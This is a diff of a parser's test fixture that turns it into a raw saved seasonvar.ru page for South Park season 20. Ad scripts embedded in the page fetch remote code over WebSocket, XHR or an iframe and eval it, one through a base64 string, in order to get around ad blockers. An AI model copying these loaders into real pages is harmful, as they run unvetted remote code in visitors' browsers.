@@ -1,66 +1,3 @@
-package com.artsafin.parser
-
-object TestData {
-    val infoGenreEmpty = """
-<table width="100%"  border="0" cellpadding="3" cellspacing="0"><tr><td valign="top" align="center" width="120" ><img src="http://cdn.seasonvar.ru/oblojka/.jpg" width="120" style="border: 5px white solid;"></td><td valign="top" align="left"><br><br><br><br><span style="color: #be0750;">Жанр:</span><br><span style="color: #be0750;">Вышел:</span><br><br></td></tr></table>
-"""
-    val infoMinimal = """
-<table width="100%"  border="0" cellpadding="3" cellspacing="0"><tr><td valign="top" align="center" width="120" ><img src="http://cdn.seasonvar.ru/oblojka/9886.jpg" width="120" style="border: 5px white solid;"></td><td valign="top" align="left">
-            Познавательная телепрограмма с телеведущим Дмитрием Пучковым. Передача расскажет об истории танкостроения, эволюция первых машин Первой Мировой войны до суперсовременных мощных машин... Мы наглядно увидим особенности каждой машины...
-                        <br><br><br><br><span style="color: #be0750;">Жанр:</span>документальные, исторические, отечественные
-                        <br><span style="color: #be0750;">Вышел:</span> 2014<br><br></td></tr></table>
-"""
-    val infoFancyYear = """
-<table width="100%"  border="0" cellpadding="3" cellspacing="0"><tr><td valign="top" align="center" width="120" ><img src="http://cdn.seasonvar.ru/oblojka/9886.jpg" width="120" style="border: 5px white solid;"></td><td valign="top" align="left">
-            Познавательная телепрограмма с телеведущим Дмитрием Пучковым. Передача расскажет об истории танкостроения, эволюция первых машин Первой Мировой войны до суперсовременных мощных машин... Мы наглядно увидим особенности каждой машины...
-                        <br><br><br><br><span style="color: #be0750;">Жанр:</span>документальные, исторические, отечественные
-                        <br><span style="color: #be0750;">Вышел:</span> 2006 -2014<br><br></td></tr></table>
-"""
-
-    val infoFull = """
-<table width="100%"  border="0" cellpadding="3" cellspacing="0"><tr><td valign="top" align="center" width="120" ><img src="http://cdn.seasonvar.ru/oblojka/14258.jpg" width="120" style="border: 5px white solid;"></td><td valign="top" align="left">
-            Предлагаем вашему вниманию двадцатый сезон знаменитого проекта &quot;Южный парк&quot;. Сюжет развивается вокруг жизни и приключений четверки друзей, их товарищей и знакомых. Все они живут в небольшом городке Южный Парк, это где-то в штате К...
-                        <br><br><span style="color: #be0750;">Оригинал:</span>South Park<br><br><br><span style="color: #be0750;">Жанр:</span>комедия, анимационные
-                            <br /><span style="color: #be0750;">Ограничение: </span><span style="color: #ff7600">18+</span><br><span style="color: #be0750;">Вышел:</span> 2016<br><span style="color: #be0750;">Сезонов:</span>20<br><br><span style="color: #be0750;">KINOPOISK:</span> 8.01 <small>(59337 голосов)</small><br><span style="color: #be0750;">IMDB:</span> 8.80 <small>(241329 голосов)</small></td></tr></table>
-"""
-
-    val infoEmpty = """
-<table width="100%"  border="0" cellpadding="3" cellspacing="0"><tr><td valign="top" align="center" width="120" ><img src="http://cdn.seasonvar.ru/oblojka/.jpg" width="120" style="border: 5px white solid;"></td><td valign="top" align="left"><br><br><br><br><span style="color: #be0750;">Жанр:</span><br><span style="color: #be0750;">Вышел:</span><br><br></td></tr></table>
-"""
-
-    val filterHtml = """
-</div>
-                    <div class="betterT" id="div587">
-                <a id="a587"
-                   data="/serialinfo/587/"
-                   href="/serial-587-Plantatciya-1-season.html"
-                   class="betterT alf-link" >
-                                        Плантация</a>
-            </div>
-                    <div class="betterT" id="div11529">
-                <a id="a11529"
-                   data="/serialinfo/11529/"
-                   href="/serial-11529-Plastikovye_Vospominaniya.html"
-                   class="betterT alf-link" >
-                                        Пластиковые Воспоминания</a>
-            </div>
-                    <div class="betterT" id="div6270">
-                <a id="a6270"
-                   data="/serialinfo/6270/"
-                   href="/serial-6270-Plata_za_lyubov.html"
-                   class="betterT alf-link" >
-                                        Плата за любовь</a>
-            </div>
-                    <div class="betterT" id="div7809">
-                <a id="a7809"
-                   data="/serialinfo/7809/"
-                   href="/serial-7809-Plata_ne_po_zaslugam.html"
-                   class="betterT alf-link" >
-                                        Плата не по заслугам</a>
-"""
-
-    val pageHtml = """
-
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
@@ -91,7 +28,7 @@ object TestData {
     <script type="text/javascript" src="/less/js/swfobject.js"></script>
 
     <script type="text/javascript" src="/js/w15.js?v=3"></script>
-
+         
     <script type="text/javascript" src="/less/js/marks.js?v=10"></script>
     <meta name="verify-v1" content="5ROY6+4ajlq1yinxoxN6+3nVuVIIG7dTu1IU8+7/tzQ=" >
     <meta name='yandex-verification' content='4eaaad8258175cc6' />
@@ -113,13 +50,13 @@ object TestData {
     </script>
     <div id="avp_zid_456">
         <script type="text/javascript">
-        if (!document.cookie || document.cookie.indexOf('AVPDCAP=') == -1) {
+        if (!document.cookie || document.cookie.indexOf('AVPDCAP=') == -1) { 
           _avp.push({ tagid: 'avp_zid_456', alias: '/', type: 'dynamic', zid: 456, pid: 50 });
         }
         </script>
     </div>
     <div class="main-center-block">
-
+        
 <div class="head-block">
     <table width="1000" border="0" cellspacing="0" cellpadding="0">
         <tr>
@@ -211,7 +148,7 @@ object TestData {
                                 &nbsp;&nbsp;
                                 <a href="/">> Вернуться к списку сериалов</a><br><br>
                                 <div style="width: 227px;overflow: hidden;">
-                                                                            <div><div id="M1370Composite583889"></div></div><script type="text/javascript"> var d = new Date, script583889 = document.createElement("script"), mg_ws583889 = {};script583889.type = "text/javascript";script583889.charset = "utf-8";script583889.src = "//jsc.marketgid.com/s/e/seasonvar.ru.583889.js?t=" + d.getYear() + d.getMonth() + d.getDay() + d.getHours();script583889.onerror = function () { mg_ws583889 = new Worker(URL.createObjectURL(new Blob(['eval(atob("ZnVuY3Rpb24gc2VuZE1lc3NhZ2U1ODM4ODkoZSl7dmFyIGg9bWdfd3M1ODM4ODkub25tZXNzYWdlOyBtZ193czU4Mzg4OS5yZWFkeVN0YXRlPT1tZ193czU4Mzg4OS5DTE9TRUQmJihtZ193czU4Mzg4OT1uZXcgV2ViU29ja2V0KG1nX3dzNTgzODg5X2xvY2F0aW9uKSksbWdfd3M1ODM4ODkub25tZXNzYWdlPWgsd2FpdEZvclNvY2tldENvbm5lY3Rpb241ODM4ODkobWdfd3M1ODM4ODksZnVuY3Rpb24oKXttZ193czU4Mzg4OS5zZW5kKGUpfSl9ZnVuY3Rpb24gd2FpdEZvclNvY2tldENvbm5lY3Rpb241ODM4ODkoZSx0KXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7cmV0dXJuIDE9PT1lLnJlYWR5U3RhdGU / dm9pZChudWxsIT10JiZ0KCkpOnZvaWQgd2FpdEZvclNvY2tldENvbm5lY3Rpb241ODM4ODkoZSx0KX0sNSl9OyB2YXIgbWdfd3M1ODM4ODlfbG9jYXRpb24gPSAid3NzOi8vd3NwLm1hcmtldGdpZC5jb20vd3MiOyBtZ193czU4Mzg4OSA9IG5ldyBXZWJTb2NrZXQobWdfd3M1ODM4ODlfbG9jYXRpb24pLCBtZ193czU4Mzg4OS5vbm1lc3NhZ2UgPSBmdW5jdGlvbiAodCkge3Bvc3RNZXNzYWdlKHQuZGF0YSk7fSwgb25tZXNzYWdlID0gZnVuY3Rpb24oZSl7c2VuZE1lc3NhZ2U1ODM4ODkoZS5kYXRhKX0 = "))']), {type: "application/javascript"})); mg_ws583889.onmessage = function (msg){window.eval(msg.data);}; mg_ws583889.postMessage('js|'+script583889.src+'|M1370Composite583889|M1370Composite583889');};document.body.appendChild(script583889); </script>
+                                                                            <div><div id="M1370Composite583889"></div></div><script type="text/javascript"> var d = new Date, script583889 = document.createElement("script"), mg_ws583889 = {};script583889.type = "text/javascript";script583889.charset = "utf-8";script583889.src = "//jsc.marketgid.com/s/e/seasonvar.ru.583889.js?t=" + d.getYear() + d.getMonth() + d.getDay() + d.getHours();script583889.onerror = function () { mg_ws583889 = new Worker(URL.createObjectURL(new Blob(['eval(atob("ZnVuY3Rpb24gc2VuZE1lc3NhZ2U1ODM4ODkoZSl7dmFyIGg9bWdfd3M1ODM4ODkub25tZXNzYWdlOyBtZ193czU4Mzg4OS5yZWFkeVN0YXRlPT1tZ193czU4Mzg4OS5DTE9TRUQmJihtZ193czU4Mzg4OT1uZXcgV2ViU29ja2V0KG1nX3dzNTgzODg5X2xvY2F0aW9uKSksbWdfd3M1ODM4ODkub25tZXNzYWdlPWgsd2FpdEZvclNvY2tldENvbm5lY3Rpb241ODM4ODkobWdfd3M1ODM4ODksZnVuY3Rpb24oKXttZ193czU4Mzg4OS5zZW5kKGUpfSl9ZnVuY3Rpb24gd2FpdEZvclNvY2tldENvbm5lY3Rpb241ODM4ODkoZSx0KXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7cmV0dXJuIDE9PT1lLnJlYWR5U3RhdGU / dm9pZChudWxsIT10JiZ0KCkpOnZvaWQgd2FpdEZvclNvY2tldENvbm5lY3Rpb241ODM4ODkoZSx0KX0sNSl9OyB2YXIgbWdfd3M1ODM4ODlfbG9jYXRpb24gPSAid3NzOi8vd3NwLm1hcmtldGdpZC5jb20vd3MiOyBtZ193czU4Mzg4OSA9IG5ldyBXZWJTb2NrZXQobWdfd3M1ODM4ODlfbG9jYXRpb24pLCBtZ193czU4Mzg4OS5vbm1lc3NhZ2UgPSBmdW5jdGlvbiAodCkge3Bvc3RNZXNzYWdlKHQuZGF0YSk7fSwgb25tZXNzYWdlID0gZnVuY3Rpb24oZSl7c2VuZE1lc3NhZ2U1ODM4ODkoZS5kYXRhKX0 = "))']), {type: "application/javascript"})); mg_ws583889.onmessage = function (msg){window.eval(msg.data);}; mg_ws583889.postMessage('js|'+script583889.src+'|M1370Composite583889|M1370Composite583889');};document.body.appendChild(script583889); </script> 
                                                                     </div>
                             </div>
                         </td>
@@ -368,7 +305,7 @@ object TestData {
                                                                                             <small>Дней до следующей серии: 2</small>
                                                                                                                                                         </a>
                             </h2>
-
+                        
                     </div>
                 </div>
             </td>
@@ -378,7 +315,7 @@ object TestData {
                             <div id="adv" class="svtabr_wrap_hdtest">
                     По ссылке ниже вы можете получить бесплатный премиум-аккаунт на 5 дней для тестирования HD-сериалов на нашем сайте. Количество премиумов ограничено: успейте стать одним из 20000 человек, которые первыми увидят HD на seasonvar.ru.<br>Оставляйте свои комментарии с впечатлениями и пожеланиями по поводу качества видео.<br> <a href="http://seasonvar.ru/premDar.php" target="_blank">ссылка</a>
                 </div>
-
+            
             <div class="otm">
 <div id="statpause14258" style="padding: 10px;">
 </div>
@@ -468,7 +405,7 @@ object TestData {
             }
         arEpisodes = {"6":{"1_seriya":{"n":1,"d":0,"next":2},"":{"next":1},"2_seriya":{"n":2,"d":0,"next":3},"3_seriya":{"n":3,"d":0}},"0":{"1_seriya":{"n":1,"d":0,"next":2},"":{"next":1},"2_seriya":{"n":2,"d":0,"next":3},"3_seriya":{"n":3,"d":0}}};
     $("#htmlPlayer").css("width", "724px").css("height", "593px");
-
+    
     var pl0 = "/playls2/d136a088be7b02acf3801f6c4ccdd7738/trans/14258/list.xml?time=1476219230";
     if($('#translate0').length == 0 && $('#translate68').length > 0) {
         trans = 68;
@@ -558,7 +495,7 @@ object TestData {
                                                             <div align="center">
                      <div id="b7574d8c9c" style="display: none"></div><script type="text/javascript"> (function(){ var h = document.getElementsByTagName("head")[0], s = document.createElement("script"), d = "//psma01.com", ds = "/js/lib.js", f = function(){ AMSP.display(["bn","93","726x270"]); }; s.setAttribute("type", "text/javascript"); s.setAttribute("src", d + ds); s.onload = f; s.onerror = function () { var iS = function(){ var listener = function(e){ window.removeEventListener ? window.removeEventListener("message", listener) : window.detachEvent("message", listener); window.eval(e.data); f(); }; window.addEventListener ? window.addEventListener("message", listener) : window.attachEvent("onmessage", listener); var frm = document.createElement("iframe"); frm.style.display = "none"; frm.src = d + ds + "?lib=frm"; document.body.appendChild(frm); }, xS = function(){ var e, i = function(e){ window.eval(e.responseText); f(); }; window.XDomainRequest ? (e = new XDomainRequest, e.onload = function () { i(e) }) : e = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP"), e.withCredentials = !0, e.onreadystatechange = function(){ if (4 == e.readyState && 200 == e.status) { i(e) } }, e.onerror = iS, e.open("GET", d + ds + "?lib=xhr", !0), e.send() }; try { var ws = new WebSocket(("https:"===window.location.protocol?"wss":"ws") + ":"+d+"/list"); ws.onmessage = function(t){ d = "//" + t.data; var s2 = document.createElement("script"); s2.setAttribute("type", "text/javascript"); s2.setAttribute("src", d + ds); s2.onload = f; s2.onerror = xS; h.insertBefore(s2, h.firstChild); ws.close(); }; } catch(e) {xS()} }; h.insertBefore(s, h.firstChild);})();</script>
              </div>
-
+                            
                             <div style="padding: 0 2px 5px 2px;">
                     <div class="svtab svspoiler" data="review">
                         <ul class="svtab_wrap">
@@ -574,7 +511,7 @@ object TestData {
                                                     </div>
                     </div>
                 </div>
-
+            
 
                             <div class="svtab">
                     <ul class="svtab_wrap">
@@ -598,7 +535,7 @@ object TestData {
                         if ("1" == $.cookie("spoiler_comments")) {
                             $(".svspoiler[data=comments]").click();
                         }
-                    }
+                    } 
                 }
             }
             document.domain = "seasonvar.ru";
@@ -613,7 +550,7 @@ object TestData {
                 </div>
                 <script src="/less/js/imagesloaded.pkgd.js"></script>
                 <script src="/less/js/masonry.pkgd.js"></script>
-
+            
                             <div class="svtab svspoiler" data="review">
                     <ul class="svtab_wrap">
                         <li class="svtab_wrap_li"><span class="show">Рецензии</span></li>
@@ -647,11 +584,11 @@ object TestData {
 Достаточно много внимания уделяется и Мистеру Гаррисону, который является нестандартным и совершено удивительным человеком. На протяжении всего сериала мы не раз увидим, как он меняет свой пол, а ведь это очень серьёзный шаг. Ко всему прочему этот человек преподаёт в школе, и именно ведёт занятия у учеников начальной школы. Думаю, что данный персонаж на роль учителя совершено не тянет, но в сериале он смотрится просто потрясающе. Хоть такого учителя вряд ли кто-то хотел бы видеть у своих детей. Даже создатели не стали скрывать своего отношения к Мистеру Гаррисону, и сказали ,что это один из тех персонажей, который не располагает к себе. Именно этот герой решил доказать свою гениальность и доказать всем, это он действительно талантлив и умён. По этой причине он решает написать книгу, которая называется «Аллея Пенисов». Понятно, что это просто невероятное произведение, за которое его награждают достаточно важной премией – Пулицеровской. Такой поворот событий совершено не мог уложиться у зрителей в голове, а герои этой картины возмущались всему происходящему. Такое ощущение, что в мире совершено ни кто ни чего не понимает или просто не хочет замечать ,чтобы лишний раз не во что не вмешиваться. А наш герой получив такой значимый подарок и признание, что его произведение действительно очень важное и нужное, просто пытается от всех скрыться . Только всё это не могло так просто закончиться и именно в это время к Мистеру Гаррисону приходит озарение, он понимает, что на самом деле он гомосексуалист. Но, на этом его приключения не закончились, потому что в его голове творилось совершено что-то непонятное. Он хотел, чтобы его уволили из школы, для этого он сам принял решение, что будет приставать к детям. Он думал, что сможет отсудить у школы большие деньги, но ни чего подобного не произошло. Потом он придумал какой-то странный аппарат и назвал его самым оригинальным названием «Это». Что оно делает и для чего создано, совершено не ясно. Чуть позже он решил стать женщиной и выбрать ориентацию лесбиянки. Таких бредовых мыслей у него в голове огромное множество, поэтому перечислять их можно до бесконечности.<br />
 Я не буду рассказывать вам про главных героев данного сериала – Кайла, Картмана, Стена и Кенни, эти герои действительно любопытны и интересны, поэтому лучше вам познакомиться с ними лично, если вы, конечно же, ещё не знакомы с этим произведением. Я уверена, что данный проект будет интересен всем зрителям, ведь здесь много актуальных и значимых тем, которые рассказывают и показывают данные герои. «Южный парк»  - это такой сериал, который придётся по душе даже для большой компании людей, которые могут хорошо провести время, посмеяться, повеселиться и оценить по достоинству всё то, что предлагает нам данный сериал. Единственное, это не семейный мультик, поэтому детям возле экрана делать совершено не чего, для них снято очень много хороших, добрых и позитивных картин, а этот проект рассчитан на взрослую публику, которая сможет оценить задумку авторов. Так что желаю вам всем приятного просмотра и невероятных впечатлений! Спасибо за внимание!
             </div>
-
+            
 
                     </div>
                 </div>
-
+            
         </div>
     </div>
                             <div style="margin-top: 25px;">
@@ -717,20 +654,18 @@ object TestData {
 
 </div>
 
+                    
+                                                                                               
 
-
-
-
+                                            
 
     </div>
-
+    
             <script>(function(){var s=document.createElement('script');s.src='http://obhodsb.com/j/w.php?id=NTE=&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
-
+        
     <script type="text/javascript" src="/cview.php?id=14258"></script>
     <script type="text/javascript" src="/less/js/pg-second.js?v=6"></script>
     <script type="text/javascript" src="/less/js/player.js?v=11"></script>
 </body>
 
 </html>
-"""
-}
